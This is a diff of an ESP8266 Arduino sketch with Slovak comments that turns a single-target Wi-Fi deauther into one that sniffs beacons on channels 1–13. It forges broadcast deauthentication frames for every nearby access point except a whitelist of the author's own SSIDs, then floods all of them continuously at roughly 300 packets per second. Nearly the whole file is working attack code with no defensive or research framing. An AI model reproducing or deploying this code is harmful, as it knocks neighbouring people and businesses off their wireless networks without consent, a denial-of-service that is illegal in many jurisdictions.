@@ -1,154 +1,163 @@
-#include <ESP8266WiFi.h>
-
+#ifdef ESP8266
 extern "C" {
-  #include "user_interface.h"
+#include "ets_sys.h"
+#include "osapi.h"
+#include "user_interface.h"
+}
+#endif
+
+#include <Arduino.h>
+
+// —————— WHITELIST (presné SSID) ——————
+#define WHITELIST_ENABLED 1
+
+const char* EXCLUDE_SSID[] = {
+  "TP-Link_3997",
+  //"TP-LINK_A2183C",
+  "RasPi-Fi",
+  "NUO_9E75",
+  "TP-Link_3997_Ext"
+  //"",  // Hidden networks -> EMPTY SSID
+};
+const int EXCLUDE_COUNT = sizeof(EXCLUDE_SSID) / sizeof(EXCLUDE_SSID[0]);
+
+int shouldExclude(const char* ssid) {
+  if (!WHITELIST_ENABLED) return 0;
+  for (int i = 0; i < EXCLUDE_COUNT; i++) {
+    if (strcmp(ssid, EXCLUDE_SSID[i]) == 0) return 1;
+  }
+  return 0;
 }
 
-// —————— NASTAVENIA ——————
-const int DEAUTH_DURATION_MS = 10000;  // Ako dlho deauthovať (10s)
-const int SCAN_INTERVAL_MS = 2000;     // Koľko čakať po deauthu pred novým scanom
-const int DEAUTH_RATE_HZ = 200;         // Paketov za sekundu (odporúčané: 100–300)
+// —————— AP ŠTRUKTÚRA (čisté C, žiadne Stringy) ——————
+#define MAX_SSID_LEN 32
+#define MAX_APS 30
 
-// —————— GLOBÁLNE ——————
-struct ApInfo {
-  String ssid;
+struct AccessPoint {
+  char essid[MAX_SSID_LEN + 1];
   uint8_t bssid[6];
   int channel;
-  int rssi;
+  uint8_t deauthPacket[26];
 };
 
-ApInfo currentTarget;
-bool hasTarget = false;
-unsigned long lastDeauthEnd = 0;
+struct AccessPoint aps[MAX_APS];
+int current = -1;
 
-// —————— POMOCNÉ ——————
-String bssidToString(const uint8_t* bssid) {
-  char buf[18];
-  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
-  return String(buf);
-}
+// —————— SNIFFER CALLBACK ——————
+void ICACHE_FLASH_ATTR promisc_cb(uint8_t *buf, uint16_t len) {
+  if (len < 12 + 38) return;
 
-bool sendDeauth(const uint8_t* bssid, const uint8_t* ap_mac, uint8_t channel) {
-  uint8_t packet[26] = {
-    0xC0, 0x00, 0x00, 0x00, // typ, duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // broadcast (addr1)
-    ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5], // addr2
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // addr3 = BSSID
-    0x00, 0x00
-  };
-  wifi_set_channel(channel);
-  return wifi_send_pkt_freedom(packet, 26, 0) == 0;
-}
+  // Preskoč RxControl (12 bajtov)
+  uint8_t *frame = buf + 12;
 
-ApInfo findStrongestAp() {
-  Serial.println("[SCAN] Hľadám najsilnejšiu sieť...");
-  int n = WiFi.scanNetworks(false, true); // async + passive
-  delay(5000);
-  n = WiFi.scanComplete();
+  // Beacon: type 0x80
+  if (frame[0] != 0x80) return;
 
-  ApInfo best;
-  int bestRssi = -1000;
+  uint8_t bssid[6];
+  memcpy(bssid, frame + 10, 6);
+  int ssid_len = frame[37];
+  if (ssid_len > MAX_SSID_LEN) ssid_len = MAX_SSID_LEN;
 
-  for (int i = 0; i < n; i++) {
-    int rssi = WiFi.RSSI(i);
-    if (rssi > bestRssi && WiFi.SSID(i).length() > 0) {
-      bestRssi = rssi;
-      best.ssid = WiFi.SSID(i);
-      WiFi.BSSID(i, best.bssid);
-      best.channel = WiFi.channel(i);
-      best.rssi = rssi;
+  char essid[MAX_SSID_LEN + 1] = {0};
+  for (int i = 0; i < ssid_len; i++) {
+    char c = frame[38 + i];
+    if (c >= 32 && c < 127) essid[i] = c;
+  }
+  essid[ssid_len] = 0;
+
+  if (shouldExclude(essid)) return;
+
+  // Skontroluj, či už existuje
+  for (int i = 0; i <= current; i++) {
+    if (memcmp(aps[i].bssid, bssid, 6) == 0) {
+      return; // už máme
     }
   }
 
-  if (bestRssi > -100) {
-    Serial.printf("[SCAN] Najsilnejšia: %s (%s) ch=%d rssi=%d\n",
-      best.ssid.c_str(), bssidToString(best.bssid).c_str(), best.channel, best.rssi);
-    return best;
-  } else {
-    Serial.println("[SCAN] Žiadna sieť nenájdená.");
-    return ApInfo();
+  // Pridaj novú
+  if (current + 1 < MAX_APS) {
+    current++;
+    strncpy(aps[current].essid, essid, MAX_SSID_LEN);
+    memcpy(aps[current].bssid, bssid, 6);
+    aps[current].channel = *(buf + 8); // channel je v RxControl[8] (low 4 bity)
+
+    // Postav deauth paket
+    uint8_t pkt[26] = {
+      0xC0, 0x00,                           // Deauth
+      0x00, 0x00,                           // Duration
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // addr1: broadcast
+      bssid[0], bssid[1], bssid[2],        // addr2: BSSID
+      bssid[3], bssid[4], bssid[5],
+      bssid[0], bssid[1], bssid[2],        // addr3: BSSID
+      bssid[3], bssid[4], bssid[5],
+      0x00, 0x00,                           // seq
+      0x01, 0x00                            // reason
+    };
+    memcpy(aps[current].deauthPacket, pkt, 26);
+
+    Serial.printf("[+] %s (CH%d)\n", essid, aps[current].channel);
   }
+}
+
+// —————— SCAN ——————
+void scan() {
+  Serial.println("[SCAN] Start...");
+
+  wifi_promiscuous_enable(0);
+  wifi_set_promiscuous_rx_cb(promisc_cb);
+  wifi_promiscuous_enable(1);
+
+  const int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
+  const int num_ch = sizeof(channels) / sizeof(channels[0]);
+
+  for (int round = 0; round < 2; round++) {
+    for (int i = 0; i < num_ch; i++) {
+      wifi_set_channel(channels[i]);
+      delay(200);
+    }
+  }
+
+  wifi_promiscuous_enable(0);
+  wifi_set_promiscuous_rx_cb(NULL);
+
+  Serial.printf("[SCAN] Hotovo. AP: %d\n", current + 1);
+}
+
+// —————— DEAUTH (bez referencie!) ——————
+void sendDeauth(int index) {
+  if (index < 0 || index > current) return;
+  wifi_set_channel(aps[index].channel);
+  wifi_send_pkt_freedom(aps[index].deauthPacket, 26, 0);
 }
 
 // —————— SETUP ——————
 void setup() {
   Serial.begin(115200);
-  delay(100);
+  delay(500);
+  Serial.println("\n=== ESP8266 Deauther (Final, C-safe) ===");
 
-  // Iba STA režim (stačí na scan a deauth)
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-
-  Serial.println("\n=== ESP8266 Single Deauther ===");
-  Serial.println("Čakám na prvé skenovanie...");
+  wifi_set_opmode(STATION_MODE);
+  scan();
 }
 
 // —————— LOOP ——————
 void loop() {
-  unsigned long now = millis();
+  static unsigned long last_scan = millis();
+  const unsigned long SCAN_INTERVAL = 60000; // 60s
 
-  // ———— 1. Ak už deauthoval, ale čas vypršal → pauza → nový scan
-  if (hasTarget && (now - lastDeauthEnd) > SCAN_INTERVAL_MS) {
-    Serial.println("[INFO] Pauza skončila — kontrolujem nové siete...");
-    ApInfo newTarget = findStrongestAp();
-    
-    if (newTarget.ssid.length() == 0) {
-      Serial.println("[INFO] Žiadna sieť — čakám 5s.");
-      delay(5000);
-      return;
-    }
-
-    // Porovnaj BSSID: ak sa zmenila → prepnúť
-    bool sameBssid = (memcmp(newTarget.bssid, currentTarget.bssid, 6) == 0);
-    if (!sameBssid || newTarget.rssi > currentTarget.rssi + 5) { // +5 dBm → nová lepšia
-      Serial.println("[INFO] Zmena cieľa: nová sieť je silnejšia/odlišná.");
-      currentTarget = newTarget;
-      hasTarget = true;
-    } else {
-      Serial.println("[INFO] Cieľ sa nezmenil — pokračujem v deauthu.");
-    }
-
-    // Spustiť nový deauth cyklus
-    lastDeauthEnd = 0; // reset — aby sa spustil deauth nižšie
+  if (millis() - last_scan > SCAN_INTERVAL) {
+    scan();
+    last_scan = millis();
   }
 
-  // ———— 2. Ak nemáme cieľ, alebo čas na ďalší deauth
-  if (!hasTarget || now >= lastDeauthEnd + SCAN_INTERVAL_MS) {
-    if (!hasTarget) {
-      currentTarget = findStrongestAp();
-      if (currentTarget.ssid.length() == 0) {
-        delay(5000);
-        return;
-      }
-      hasTarget = true;
+  // ~300 paketov/s (bezpečné)
+  static unsigned long last_deauth = 0;
+  if (millis() - last_deauth > 3) {
+    for (int i = 0; i <= current; i++) {
+      sendDeauth(i);
     }
-
-    // ———— 3. Deauth fáza (DEAUTH_DURATION_MS)
-    Serial.printf("[DEAUTH] Začínam deauth na %s (%s) na %d s\n",
-      currentTarget.ssid.c_str(), bssidToString(currentTarget.bssid).c_str(),
-      DEAUTH_DURATION_MS / 1000);
-
-    unsigned long start = millis();
-    int packetsSent = 0;
-    unsigned long nextPacket = start;
-
-    while (millis() - start < DEAUTH_DURATION_MS) {
-      unsigned long now2 = millis();
-      if (now2 >= nextPacket) {
-        if (sendDeauth(currentTarget.bssid, currentTarget.bssid, currentTarget.channel)) {
-          packetsSent++;
-        } else {
-          Serial.println("[!] Chyba pri odosielaní deauth paketu!");
-        }
-        nextPacket += 1000 / DEAUTH_RATE_HZ; // napr. 5ms → 200 Hz
-      }
-      delayMicroseconds(100); // neblokuj watchdog
-    }
-
-    Serial.printf("[DEAUTH] Hotovo. Poslaných %d paketov.\n", packetsSent);
-    lastDeauthEnd = millis();
+    last_deauth = millis();
   }
 
-  delay(1);
+  yield();
 }
